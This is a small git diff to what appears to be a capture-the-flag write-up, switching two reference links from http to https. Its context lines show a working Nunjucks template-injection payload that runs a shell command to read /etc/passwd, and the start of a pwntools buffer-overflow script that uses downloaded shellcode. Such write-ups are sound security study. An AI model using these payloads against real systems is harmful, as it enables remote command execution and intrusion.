@@ -764,7 +764,7 @@ After updating it and if we go back to the home page and open up the card,
 
 We see that `49` was rendered in the naughty list, therefore proving that a Server-Side Template Injection vulnerability existed!
 
-Searching online, I found a working payload [here](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine).
+Searching online, I found a working payload [here](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine).
 
 ```js
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
@@ -1063,7 +1063,7 @@ offset = 72
 address = p64(int(re.search(b"\[(0x.*?)\]", prompt1).group(1).decode(), 16))             
 ```
 
-Now lets put together everything and add the shellcode from [here](http://shell-storm.org/shellcode/files/shellcode-806.php).
+Now lets put together everything and add the shellcode from [here](https://shell-storm.org/shellcode/files/shellcode-806.php).
 
 ```python
 from pwn import *
